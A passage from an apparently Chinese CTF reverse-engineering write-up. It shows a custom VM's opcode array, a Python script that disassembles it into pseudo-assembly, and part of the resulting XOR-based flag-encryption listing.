class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <br>  <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <br>  <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0C</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2D</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <br>  <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <br>  <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x02</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <br>  <span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x05</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x09</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <br>  <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x08</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <br>  <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0E</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <br>  <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xE7</span>, <br>  <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xF4</span><br>]<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(opcode)):<br>    <span class="hljs-keyword">if</span>(opcode[i]==<span class="hljs-number">0xF1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br>        <span class="hljs-keyword">if</span>(opcode[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0xE1</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eax flag[&quot;</span>+<span class="hljs-built_in">str</span>(opcode[i+<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;]&quot;</span>)<br>        <span class="hljs-keyword">elif</span>(opcode[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0xE2</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ebx flag[&quot;</span>+<span class="hljs-built_in">str</span>(opcode[i+<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;]&quot;</span>)<br>        <span class="hljs-keyword">elif</span>(opcode[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0xE3</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ecx flag[&quot;</span>+<span class="hljs-built_in">str</span>(opcode[i+<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;]&quot;</span>)<br>        <span class="hljs-keyword">elif</span>(opcode[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0xE4</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag[&quot;</span>+<span class="hljs-built_in">str</span>(opcode[i+<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;] eax&quot;</span>)<br>        <span class="hljs-keyword">elif</span>(opcode[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0xE5</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;edx flag[&quot;</span>+<span class="hljs-built_in">str</span>(opcode[i+<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;]&quot;</span>)<br>        <span class="hljs-keyword">elif</span>(opcode[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0xE7</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag[&quot;</span>+<span class="hljs-built_in">str</span>(opcode[i+<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;] ebx&quot;</span>)<br>        i+=<span class="hljs-number">6</span><br>    <span class="hljs-keyword">elif</span>(opcode[i]==<span class="hljs-number">0xF2</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor eax ebx&quot;</span>)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(opcode[i]==<span class="hljs-number">0xF5</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmp strlen&quot;</span>)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(opcode[i]==<span class="hljs-number">0xF4</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nop&quot;</span>)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(opcode[i]==<span class="hljs-number">0xF7</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul eax edx&quot;</span>)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(opcode[i]==<span class="hljs-number">0xF8</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;swap eax ebx&quot;</span>)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(opcode[i]==<span class="hljs-number">0xF6</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eax = ecx+2*ebx+3*eax&quot;</span>)  <br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>输出得到伪代码,前面部分是干扰的，后面那一段才是真正的加密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmp</span> strlen<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">32</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">33</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">34</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">3</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">35</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">36</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">37</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">6</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">38</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">7</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">39</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">8</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">40</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">41</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">10</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">42</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">11</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">43</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">12</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">44</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">13</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">45</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">14</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">46</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">15</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">47</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">16</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">48</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">17</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">49</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">18</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">50</span>] eax<br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">19</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">51</span>] eax<br><span class="hljs-attribute">nop</span><br><br><br><span class="hljs-attribute">cmp</span> strlen<br><br><span class="hljs-comment">#六个异或</span><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">0</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">1</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">3</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">2</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">3</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span class="hljs-number">3</span>] eax<br><br><span class="hljs-attribute">mov</span> eax flag[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">mov</span> ebx flag[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">xor</span> eax ebx<br><span class="hljs-attribute">mov</span> flag[<span 